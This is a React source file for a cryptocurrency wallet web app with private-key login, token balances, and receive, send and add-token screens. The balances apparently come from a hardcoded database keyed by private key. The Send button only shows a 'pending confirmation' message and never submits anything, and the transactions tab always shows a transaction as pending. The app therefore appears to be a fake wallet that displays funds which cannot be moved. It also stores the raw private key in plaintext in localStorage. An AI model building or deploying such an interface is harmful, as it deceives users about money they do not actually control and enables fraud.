          <div className="absolute inset-0 flex items-center">
            <div className="w-full border-t border-[#27272A]"></div>
          </div>
          <div className="relative flex justify-center">
            <span className="bg-[#050505] px-4 text-[#52525B] text-sm">or enter existing key</span>
          </div>
        </div>

        <div>
          <input
            type="text"
            value={privateKey}
            onChange={(e) => {
              setPrivateKey(e.target.value);
              setError("");
            }}
            onKeyPress={handleKeyPress}
            placeholder="Enter your private key (0x...)"
            className="wallet-input"
            data-testid="private-key-input"
          />
          {error && (
            <p className="text-[#FF0055] text-sm mt-2">{error}</p>
          )}
        </div>

        <button 
          onClick={handleLogin}
          disabled={!privateKey}
          className="secondary-btn w-full"
          data-testid="login-btn"
        >
          Access Wallet
        </button>
      </div>

      <p className="text-center text-[#52525B] text-sm mt-8">
        Keep your private key secure. Never share it with anyone.
      </p>
    </div>
  );
};

// Main Wallet Dashboard
const WalletDashboard = ({ privateKey, onLogout }) => {
  const [activeTab, setActiveTab] = useState("assets");
  const [showReceiveModal, setShowReceiveModal] = useState(false);
  const [showSendModal, setShowSendModal] = useState(false);
  const [selectedToken, setSelectedToken] = useState(null);
  const [showPrivateKey, setShowPrivateKey] = useState(false);
  const [showTokenModal, setShowTokenModal] = useState(false);
  const [showAddTokenModal, setShowAddTokenModal] = useState(false);
  const [customTokens, setCustomTokens] = useState([]);

  const walletData = WALLET_DATABASE[privateKey] || { wallets: {}, balances: {} };
  const balances = walletData.balances;
  const wallets = walletData.wallets;

  // Combine default and custom tokens
  const allTokens = [...DEFAULT_TOKENS, ...customTokens];

  // Calculate total USD value
  const totalUSD = allTokens.reduce((sum, token) => {
    return sum + (balances[token.id] || 0) * token.price;
  }, 0);

  // Check if wallet has any balance
  const hasBalance = totalUSD > 0;

  const copyToClipboard = async (text) => {
    try {
      await navigator.clipboard.writeText(text);
      toast.success("Copied to clipboard!");
    } catch (err) {
      const textArea = document.createElement("textarea");
      textArea.value = text;
      document.body.appendChild(textArea);
      textArea.select();
      document.execCommand("copy");
      document.body.removeChild(textArea);
      toast.success("Copied to clipboard!");
    }
  };

  const handleTokenClick = (token) => {
    setSelectedToken(token);
    setShowTokenModal(true);
  };

  const handleAddCustomToken = (token) => {
    setCustomTokens([...customTokens, token]);
    setShowAddTokenModal(false);
    toast.success(`${token.symbol} added!`);
  };

  return (
    <div className="wallet-app" data-testid="wallet-dashboard">
      <Toaster position="top-center" theme="dark" />
      
      {/* Header */}
      <div className="flex items-center justify-center p-4 border-b border-[#1a1a1a]">
        <h1 className="text-lg font-semibold" style={{ fontFamily: 'Poppins, sans-serif' }}>
          YOUR WALLET
        </h1>
      </div>

      {/* Tab Content */}
      <div className="page-content">
        {activeTab === "assets" && (
          <>
            {/* Balance Display */}
            <div className="text-center py-10 px-4 bg-gradient-to-b from-[#0a1a0f] to-[#050505]">
              <div className="text-[#A1A1AA] text-sm mb-2" style={{ fontFamily: 'Poppins, sans-serif' }}>Total Balance</div>
              <div className="balance-display text-white" data-testid="total-balance" style={{ fontFamily: 'Poppins, sans-serif' }}>
                ${totalUSD.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
              </div>
            </div>

            {/* Action Buttons */}
            <div className="flex justify-center gap-6 py-6 border-b border-[#1a1a1a]">
              <div className="flex flex-col items-center gap-2">
                <button 
                  className="action-btn"
                  onClick={() => setShowReceiveModal(true)}
                  data-testid="receive-btn"
                >
                  <ArrowDownLeft size={24} color="#FFFFFF" />
                </button>
                <span className="text-sm text-[#A1A1AA]">Receive</span>
              </div>
              <div className="flex flex-col items-center gap-2">
                <button 
                  className={`action-btn ${!hasBalance ? 'opacity-50 cursor-not-allowed' : ''}`}
                  onClick={() => hasBalance && setShowSendModal(true)}
                  disabled={!hasBalance}
                  data-testid="send-btn"
                >
                  <ArrowUpRight size={24} color="#FFFFFF" />
                </button>
                <span className="text-sm text-[#A1A1AA]">Send</span>
              </div>
            </div>

            {/* Top 10 Header */}
            <div className="flex items-center justify-between px-4 py-3">
              <h2 className="text-lg font-semibold text-white" style={{ fontFamily: 'Poppins, sans-serif' }}>
                Top 10
              </h2>
              <button 
                onClick={() => setShowAddTokenModal(true)}
                className="flex items-center gap-1 text-[#00FF94] text-sm"
                data-testid="add-token-btn"
              >
                <Plus size={16} />
                Add Token
              </button>
            </div>

            {/* Token List */}
            <div className="token-list" data-testid="token-list">
              {allTokens.map((token) => (
                <div 
                  key={token.id} 
                  className="token-item cursor-pointer"
                  onClick={() => handleTokenClick(token)}
                  data-testid={`token-${token.id}`}
                >
                  <div className="token-icon">
                    <img src={token.icon} alt={token.name} />
                  </div>
                  <div className="flex-1">
                    <div className="font-medium text-white" style={{ fontFamily: 'Poppins, sans-serif' }}>{token.name}</div>
                    <div className="flex items-center gap-2 text-sm">
                      <span className="text-[#A1A1AA]">
                        ${token.price.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: token.price < 1 ? 4 : 2 })}
                      </span>
                      <span className={`flex items-center gap-1 ${token.change >= 0 ? "price-up" : "price-down"}`}>
                        {token.change >= 0 ? <TrendingUp size={12} /> : <TrendingDown size={12} />}
                        {token.change >= 0 ? "+" : ""}{token.change}%
                      </span>
                    </div>
                  </div>
                  <div className="flex items-center gap-4">
                    <MiniChart data={token.chartData} isPositive={token.change >= 0} />
                    <div className="text-right">
                      <div className="font-medium text-white" data-testid={`balance-${token.id}`}>
                        {(balances[token.id] || 0).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 8 })} {token.symbol}
                      </div>
                      <div className="text-sm text-[#A1A1AA]">
                        ${((balances[token.id] || 0) * token.price).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
                      </div>
                    </div>
                  </div>
                </div>
              ))}
            </div>
          </>
        )}

        {activeTab === "transactions" && (
          <div className="p-6">
            <h2 className="text-xl font-bold mb-6" style={{ fontFamily: 'Poppins, sans-serif' }}>
              Transactions
            </h2>
            {hasBalance ? (
              <div className="space-y-4">
                <div className="pending-transaction">
                  <div className="flex items-center gap-3">
                    <div className="pending-dot-large" />
                    <div>
                      <div className="font-medium text-[#FFD600]">Transaction Pending</div>
                      <div className="text-sm text-[#A1A1AA]">
                        Please wait until confirmed...
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            ) : (
              <div className="empty-state">
                <Receipt size={48} color="#3F3F46" />
                <p className="text-[#A1A1AA] mt-4">No transactions yet</p>
              </div>
            )}
          </div>
        )}

        {activeTab === "settings" && (
          <div className="p-6">
            <h2 className="text-xl font-bold mb-6" style={{ fontFamily: 'Poppins, sans-serif' }}>
              Settings
            </h2>
            
            <div className="space-y-4">
              {/* Private Key Section */}
              <div className="settings-card">
                <div className="flex items-center justify-between mb-3">
                  <span className="text-[#A1A1AA]">Your Private Key</span>
                  <button 
                    onClick={() => setShowPrivateKey(!showPrivateKey)}
                    className="text-[#00FF94] text-sm flex items-center gap-1"
                    data-testid="toggle-key-visibility"
                  >
                    {showPrivateKey ? <EyeOff size={16} /> : <Eye size={16} />}
                    {showPrivateKey ? "Hide" : "Show"}
                  </button>
                </div>
                <div className="private-key-display" data-testid="settings-private-key">
                  {showPrivateKey ? privateKey : "••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••"}
                </div>
                <button 
                  onClick={() => copyToClipboard(privateKey)}
                  className="copy-btn w-full justify-center mt-3"
                  data-testid="copy-private-key"
                >
                  <Copy size={16} />
                  Copy Private Key
                </button>
              </div>

              {/* Logout Button */}
              <button 
                onClick={onLogout}
                className="logout-btn w-full"
                data-testid="logout-btn"
              >
                <LogOut size={20} />
                Logout
              </button>
            </div>
          </div>
        )}
      </div>

      {/* Bottom Navigation */}
      <div className="bottom-nav">
        <div 
          className={`nav-item ${activeTab === 'assets' ? 'active' : ''}`}
          onClick={() => setActiveTab('assets')}
          data-testid="nav-assets"
        >
          <LayoutGrid size={24} />
          <span className="text-xs">Assets</span>
        </div>
        <div 
          className={`nav-item ${activeTab === 'transactions' ? 'active' : ''}`}
          onClick={() => setActiveTab('transactions')}
          data-testid="nav-transactions"
        >
          <Receipt size={24} />
          <span className="text-xs">Transactions</span>
          {hasBalance && <div className="nav-badge" />}
        </div>
        <div 
          className={`nav-item ${activeTab === 'settings' ? 'active' : ''}`}
          onClick={() => setActiveTab('settings')}
          data-testid="nav-settings"
        >
          <Settings size={24} />
          <span className="text-xs">Settings</span>
        </div>
      </div>

      {/* Receive Modal */}
      {showReceiveModal && (
        <ReceiveModal 
          wallets={wallets}
          tokens={allTokens}
          onClose={() => setShowReceiveModal(false)}
          copyToClipboard={copyToClipboard}
        />
      )}

      {/* Send Modal */}
      {showSendModal && (
        <SendModal 
          balances={balances}
          tokens={allTokens}
          onClose={() => setShowSendModal(false)}
        />
      )}

      {/* Token Detail Modal */}
      {showTokenModal && selectedToken && (
        <TokenModal 
          token={selectedToken}
          balance={balances[selectedToken.id] || 0}
          walletAddress={wallets[selectedToken.id] || "Not available"}
          onClose={() => {
            setShowTokenModal(false);
            setSelectedToken(null);
          }}
          copyToClipboard={copyToClipboard}
        />
      )}

      {/* Add Token Modal */}
      {showAddTokenModal && (
        <AddTokenModal 
          onClose={() => setShowAddTokenModal(false)}
          onAdd={handleAddCustomToken}
        />
      )}
    </div>
  );
};

// Receive Modal - Select token first
const ReceiveModal = ({ wallets, tokens, onClose, copyToClipboard }) => {
  const [selectedToken, setSelectedToken] = useState(null);
  const [copied, setCopied] = useState(false);

  const handleCopy = () => {
    if (selectedToken && wallets[selectedToken.id]) {
      copyToClipboard(wallets[selectedToken.id]);
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    }
  };

  return (
    <div className="modal-overlay" onClick={onClose} data-testid="receive-modal">
      <div className="modal-content" onClick={(e) => e.stopPropagation()}>
        <div className="flex items-center justify-between p-4 border-b border-[#27272A]">
          <h2 className="text-xl font-bold" style={{ fontFamily: 'Poppins, sans-serif' }}>
            Receive
          </h2>
          <button onClick={onClose} className="p-2" data-testid="close-receive-modal">
            <X size={24} color="#A1A1AA" />
          </button>
        </div>

        <div className="p-6">
          {!selectedToken ? (
            <>
              <p className="text-[#A1A1AA] text-sm mb-4">Select token to receive:</p>
              <div className="grid grid-cols-3 gap-3">
                {tokens.map(token => (
                  <button
                    key={token.id}
                    onClick={() => setSelectedToken(token)}
                    className="flex flex-col items-center gap-2 p-3 bg-[#141414] border border-[#27272A] rounded-xl hover:border-[#00FF94] transition-colors"
                  >
                    <img src={token.icon} alt={token.symbol} className="w-8 h-8 rounded-full" />
                    <span className="text-xs text-white">{token.symbol}</span>
                  </button>
                ))}
              </div>
            </>
          ) : (
            <>
              <div className="flex items-center gap-3 mb-4">
                <button onClick={() => setSelectedToken(null)} className="text-[#A1A1AA]">
                  ← Back
                </button>
              </div>
              
              <div className="text-center mb-6">
                <img src={selectedToken.icon} alt={selectedToken.name} className="w-16 h-16 mx-auto mb-3 rounded-full" />
                <h3 className="text-lg font-semibold text-white">{selectedToken.name}</h3>
                <p className="text-sm text-[#A1A1AA]">{selectedToken.network}</p>
              </div>

              {/* QR Code Placeholder */}
              <div className="qr-container mb-6">
                <div className="qr-code">
                  <svg viewBox="0 0 100 100" className="w-full h-full">
                    <rect x="10" y="10" width="25" height="25" fill="#000"/>
                    <rect x="65" y="10" width="25" height="25" fill="#000"/>
                    <rect x="10" y="65" width="25" height="25" fill="#000"/>
                    <rect x="15" y="15" width="15" height="15" fill="#fff"/>
                    <rect x="70" y="15" width="15" height="15" fill="#fff"/>
                    <rect x="15" y="70" width="15" height="15" fill="#fff"/>
                    <rect x="18" y="18" width="9" height="9" fill="#000"/>
                    <rect x="73" y="18" width="9" height="9" fill="#000"/>
                    <rect x="18" y="73" width="9" height="9" fill="#000"/>
                    <rect x="40" y="40" width="20" height="20" fill="#000"/>
                    <rect x="45" y="45" width="10" height="10" fill="#fff"/>
                    <rect x="48" y="48" width="4" height="4" fill="#000"/>
                    <rect x="65" y="65" width="25" height="25" fill="#000"/>
                    <rect x="70" y="70" width="15" height="15" fill="#fff"/>
                    <rect x="73" y="73" width="9" height="9" fill="#000"/>
                  </svg>
                </div>
              </div>

              <div className="text-center mb-4">
                <div className="text-sm text-[#A1A1AA] mb-2">{selectedToken.symbol} Address</div>
                <div className="private-key-display text-center" data-testid="wallet-address">
                  {wallets[selectedToken.id] || "Not available"}
                </div>
              </div>

              <button 
                onClick={handleCopy}
                className="copy-btn w-full justify-center"
                data-testid="copy-address-btn"
              >
                {copied ? <Check size={16} /> : <Copy size={16} />}
                {copied ? "Copied!" : "Copy Address"}
              </button>
            </>
          )}
        </div>
      </div>
    </div>
  );
};

// Send Modal
const SendModal = ({ balances, tokens, onClose }) => {
  const [amount, setAmount] = useState("");
  const [toAddress, setToAddress] = useState("");
  const [selectedTokenId, setSelectedTokenId] = useState("usdt");

  const availableTokens = tokens.filter(t => balances[t.id] > 0);
  const selectedToken = tokens.find(t => t.id === selectedTokenId);
  const maxAmount = balances[selectedTokenId] || 0;

  const handleSend = () => {
    if (!amount || !toAddress) {
      toast.error("Please fill all fields");
      return;
    }
    if (parseFloat(amount) > maxAmount) {
      toast.error("Insufficient balance");
      return;
    }
    toast.info("Transaction submitted - pending confirmation");
    onClose();
  };

  return (
    <div className="modal-overlay" onClick={onClose} data-testid="send-modal">
      <div className="modal-content" onClick={(e) => e.stopPropagation()}>
        <div className="flex items-center justify-between p-4 border-b border-[#27272A]">
          <h2 className="text-xl font-bold" style={{ fontFamily: 'Poppins, sans-serif' }}>
            Send
          </h2>
          <button onClick={onClose} className="p-2" data-testid="close-send-modal">
            <X size={24} color="#A1A1AA" />
          </button>
        </div>

        <div className="p-6 space-y-4">
          <div>
            <label className="text-sm text-[#A1A1AA] mb-2 block">Select Token</label>
            <div className="token-select-grid">
              {availableTokens.map(token => (
                <button
                  key={token.id}
                  className={`token-select-btn ${selectedTokenId === token.id ? 'active' : ''}`}
                  onClick={() => setSelectedTokenId(token.id)}
                >
                  <img src={token.icon} alt={token.symbol} className="w-6 h-6 rounded-full" />
                  <span>{token.symbol}</span>
                </button>
              ))}
            </div>
            <div className="text-sm text-[#A1A1AA] mt-2">
              Available: {maxAmount.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 8 })} {selectedToken?.symbol}
            </div>
          </div>

          <div>
            <label className="text-sm text-[#A1A1AA] mb-2 block">Recipient Address</label>
            <input
              type="text"
              value={toAddress}
              onChange={(e) => setToAddress(e.target.value)}
              placeholder="Enter wallet address"
              className="wallet-input"
              data-testid="send-address-input"
            />
          </div>

          <div>
            <label className="text-sm text-[#A1A1AA] mb-2 block">Amount</label>
            <div className="relative">
              <input
                type="number"
                value={amount}
                onChange={(e) => setAmount(e.target.value)}
                placeholder="0.00"
                className="wallet-input pr-20"
                data-testid="send-amount-input"
              />
              <button 
                className="absolute right-3 top-1/2 -translate-y-1/2 text-[#00FF94] text-sm font-medium"
                onClick={() => setAmount(maxAmount.toString())}
              >
                MAX
              </button>
            </div>
            {amount && selectedToken && (
              <div className="text-sm text-[#A1A1AA] mt-2">
                ≈ ${(parseFloat(amount || 0) * selectedToken.price).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })} USD
              </div>
            )}
          </div>

          <button 
            className="primary-btn w-full"
            disabled={!amount || !toAddress}
            onClick={handleSend}
            data-testid="confirm-send-btn"
          >
            Send {selectedToken?.symbol}
          </button>
        </div>
      </div>
    </div>
  );
};

// Token Detail Modal
const TokenModal = ({ token, balance, walletAddress, onClose, copyToClipboard }) => {
  const [copied, setCopied] = useState(false);
  const usdValue = balance * token.price;

  const handleCopy = () => {
    copyToClipboard(walletAddress);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <div className="modal-overlay" onClick={onClose} data-testid="token-modal">
      <div className="modal-content" onClick={(e) => e.stopPropagation()}>
        <div className="flex items-center justify-between p-4 border-b border-[#27272A]">
          <div className="flex items-center gap-3">
            <img src={token.icon} alt={token.name} className="w-8 h-8 rounded-full" />
            <h2 className="text-xl font-bold" style={{ fontFamily: 'Poppins, sans-serif' }}>
              {token.name}
            </h2>
          </div>
          <button onClick={onClose} className="p-2" data-testid="close-token-modal">
            <X size={24} color="#A1A1AA" />
          </button>
        </div>

        <div className="p-6">
          <div className="text-center mb-6">
            <div className="text-3xl font-bold text-white mb-1" style={{ fontFamily: 'Poppins, sans-serif' }}>
              {balance.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 8 })} {token.symbol}
            </div>
            <div className="text-lg text-[#A1A1AA]">
              ≈ ${usdValue.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })} USD
            </div>
          </div>

          <div className="bg-[#141414] rounded-xl p-4 mb-4">
            <div className="flex justify-between items-center mb-3">
              <span className="text-[#A1A1AA]">Network</span>
              <span className="text-white font-medium">{token.network}</span>
            </div>
            <div className="flex justify-between items-center mb-3">
              <span className="text-[#A1A1AA]">Price</span>
              <span className="text-white font-medium">
                ${token.price.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: token.price < 1 ? 4 : 2 })}
              </span>
            </div>
            <div className="flex justify-between items-center">
              <span className="text-[#A1A1AA]">24h Change</span>
              <span className={token.change >= 0 ? "text-[#00FF94]" : "text-[#FF0055]"}>
                {token.change >= 0 ? "+" : ""}{token.change}%
              </span>
            </div>
          </div>

          <div className="mb-4">
            <div className="text-sm text-[#A1A1AA] mb-2">{token.symbol} Wallet Address</div>
            <div className="private-key-display" data-testid="token-wallet-address">
              {walletAddress}
            </div>
          </div>

          <button 
            onClick={handleCopy}
            className="copy-btn w-full justify-center"
            data-testid="copy-token-address"
          >
            {copied ? <Check size={16} /> : <Copy size={16} />}
            {copied ? "Copied!" : "Copy Address"}
          </button>
        </div>
      </div>
    </div>
  );
};

// Add Token Modal
const AddTokenModal = ({ onClose, onAdd }) => {
  const [contractAddress, setContractAddress] = useState("");
  const [symbol, setSymbol] = useState("");
  const [name, setName] = useState("");
  const [network, setNetwork] = useState("ERC20");

  const handleAdd = () => {
    if (!contractAddress || !symbol || !name) {
      toast.error("Please fill all required fields");
      return;
    }

    const newToken = {
      id: symbol.toLowerCase(),
      name: name,
      symbol: symbol.toUpperCase(),
      price: 0,
      change: 0,
      icon: "https://assets.coingecko.com/coins/images/279/large/ethereum.png",
      color: "#627EEA",
      chartData: [0, 0, 0, 0, 0, 0, 0],
      network: network,
      contractAddress: contractAddress
    };

    onAdd(newToken);
  };

  return (
    <div className="modal-overlay" onClick={onClose} data-testid="add-token-modal">
      <div className="modal-content" onClick={(e) => e.stopPropagation()}>
        <div className="flex items-center justify-between p-4 border-b border-[#27272A]">
          <h2 className="text-xl font-bold" style={{ fontFamily: 'Poppins, sans-serif' }}>
            Add Custom Token
          </h2>
          <button onClick={onClose} className="p-2" data-testid="close-add-token-modal">
            <X size={24} color="#A1A1AA" />
          </button>
        </div>

        <div className="p-6 space-y-4">
          <div>
            <label className="text-sm text-[#A1A1AA] mb-2 block">Network</label>
            <select 
              value={network}
              onChange={(e) => setNetwork(e.target.value)}
              className="wallet-input"
            >
              <option value="ERC20">Ethereum (ERC20)</option>
              <option value="BEP20">BNB Chain (BEP20)</option>
              <option value="TRC20">TRON (TRC20)</option>
              <option value="Solana">Solana (SPL)</option>
            </select>
          </div>

          <div>
            <label className="text-sm text-[#A1A1AA] mb-2 block">Contract Address *</label>
            <input
              type="text"
              value={contractAddress}
              onChange={(e) => setContractAddress(e.target.value)}
              placeholder="0x..."
              className="wallet-input"
              data-testid="contract-address-input"
            />
          </div>

          <div>
            <label className="text-sm text-[#A1A1AA] mb-2 block">Token Symbol *</label>
            <input
              type="text"
              value={symbol}
              onChange={(e) => setSymbol(e.target.value)}
              placeholder="e.g. USDC"
              className="wallet-input"
              data-testid="token-symbol-input"
            />
          </div>

          <div>
            <label className="text-sm text-[#A1A1AA] mb-2 block">Token Name *</label>
            <input
              type="text"
              value={name}
              onChange={(e) => setName(e.target.value)}
              placeholder="e.g. USD Coin"
              className="wallet-input"
              data-testid="token-name-input"
            />
          </div>

          <button 
            className="primary-btn w-full"
            onClick={handleAdd}
            data-testid="confirm-add-token"
          >
            Add Token
          </button>
        </div>
      </div>
    </div>
  );
};

// Main App Component
function App() {
  const [isLoggedIn, setIsLoggedIn] = useState(false);
  const [privateKey, setPrivateKey] = useState(null);

  useEffect(() => {
    const storedKey = localStorage.getItem('current_wallet_key');
    if (storedKey && VALID_PRIVATE_KEYS.includes(storedKey)) {
      setPrivateKey(storedKey);
      setIsLoggedIn(true);
    }
  }, []);

  const handleLogin = (key) => {
    setPrivateKey(key);
    setIsLoggedIn(true);
    localStorage.setItem('current_wallet_key', key);
  };

  const handleLogout = () => {
    setPrivateKey(null);
    setIsLoggedIn(false);
    localStorage.removeItem('current_wallet_key');
    toast.success("Logged out successfully");
  };

  return (
    <div className="App">
      <Toaster position="top-center" theme="dark" richColors />
      <BrowserRouter>
        <Routes>
          <Route path="/" element={
            isLoggedIn ? (
              <WalletDashboard 
                privateKey={privateKey} 
                onLogout={handleLogout}
              />
            ) : (
              <LoginPage onLogin={handleLogin} />
            )
          } />
        </Routes>
      </BrowserRouter>
    </div>
  );
}

export default App;
